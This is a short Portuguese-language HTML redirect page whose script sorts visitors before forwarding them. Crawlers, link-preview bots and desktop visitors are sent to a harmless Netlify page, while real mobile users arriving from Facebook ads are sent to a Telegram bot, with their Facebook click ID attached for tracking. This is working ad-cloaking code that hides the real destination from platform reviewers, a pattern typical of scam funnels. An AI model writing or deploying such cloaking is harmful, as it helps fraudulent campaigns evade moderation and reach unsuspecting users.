<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Redirecionando...</title>
  <script>
    const botKeywords = [
      'facebookexternalhit', 'facebot', 'twitterbot', 'linkedinbot',
      'slackbot', 'telegrambot', 'whatsapp', 'discordbot',
      'googlebot', 'bingbot', 'crawler', 'spider', 'preview',
      'httpclient', 'fetch'
    ];

    function isBot() {
      const ua = navigator.userAgent.toLowerCase();
      return botKeywords.some(bot => ua.includes(bot));
    }

    function isMobile() {
      return /android|iphone|ipad|ipod/i.test(navigator.userAgent);
    }

    function isTouchDevice() {
      return 'ontouchstart' in window || navigator.maxTouchPoints > 0;
    }

    function getFbclid() {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get('fbclid');
    }

    function buildFbc(fbclid) {
      const timestamp = Date.now();
      return `fb.1.${timestamp}.${fbclid}`;
    }

    // Execução imediata assim que o script é lido
    (function redirect() {
      const isBotAccess = isBot();
      const isRealMobile = isMobile() && isTouchDevice();
      const telegramUsername = 'joycejacobbot';

      if (isBotAccess || !isRealMobile) {
        window.location.replace('https://fernandatamires.netlify.app/');
        return;
      }

      const fbclid = getFbclid();
      const fbc = fbclid ? buildFbc(fbclid) : 'null';
      const url = `https://t.me/${telegramUsername}?start=w41510475--${encodeURIComponent(fbc)}`;

      // Redireciona o mais rápido possível
      window.location.replace(url);
    })();
  </script>
</head>
<body>
</body>
</html>
